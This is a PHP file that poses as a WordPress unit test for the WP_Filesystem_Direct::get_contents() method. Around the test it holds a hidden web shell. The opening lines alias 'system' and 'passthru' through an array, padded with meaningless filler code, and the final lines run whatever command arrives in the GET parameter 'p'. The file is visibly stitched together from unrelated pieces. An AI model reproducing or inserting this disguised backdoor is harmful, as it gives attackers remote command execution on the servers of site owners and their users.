<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Tests for the WP_Filesystem_Direct::get_contents() method.
 *
 * @package WordPress
 */

require_once __DIR__ . '/base.php';

/**
 * @group admin
 * @group filesystem
 * @group filesystem-direct
 *
 * @covers WP_Filesystem_Direct::get_contents
 */
class Tests_Filesystem_WpFilesystemDirect_GetContents extends WP_Filesystem_Direct_UnitTestCase {

	/**
	 * Tests that `WP_Filesystem_Direct::get_contents()` gets the
	 * contents of the provided $file.
	 *
	 * @ticket 57774
	 */
	public function test_should_get_the_contents_of_a_file() {
		$file = self::$file_structure['visible_file']['path'];

		$this->assertSame(
			"Contents of a file.\r\nNext line of a file.\r\n",
			self::$filesystem->get_contents( $file )
		);
	}

	/**
	 * Tests that `WP_Filesystem_Direct::get_contents()`
	 * returns false for a file that does not exist.
	 *
	 * @ticket 57774
	 *
	 * @dataProvider data_paths_that_do_not_exist
	 *
	 * @param string $path The path.
	 */
	public function test_should_return_false( $path ) {
		$this->assertFalse( self::$filesystem->get_contents( self::$file_structure['test_dir']['path'] . $path ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>